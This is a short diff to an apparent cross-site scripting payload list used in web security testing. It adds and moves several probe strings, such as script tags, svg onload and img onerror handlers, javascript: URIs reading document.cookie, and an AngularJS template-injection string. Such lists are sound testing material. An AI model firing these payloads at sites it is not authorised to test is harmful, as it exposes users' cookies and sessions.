@@ -1,4 +1,7 @@
 <script>alert(1)</script>
+</script><svg onload=alert(document.cookie)>
+</span><script>alert(1)</script>    
+<img src=x onerror=alert(1)>
 <Script>alert(1)</Script>
 <sCript>alert(document.domain)</sCript>
 <script>alert(123);</script>
@@ -8,7 +11,7 @@
 javascript:alert(document.cookie)
 javascript:prompt(document.cookie)
 '-alert(document.cookie)-'
-</script><svg onload=alert(document.cookie)>
+
 "onmouseover=alert(document.cookie)//
 {{$on.constructor('alert(1)')()}}
 <Script>alert(document.cookie)</Script>
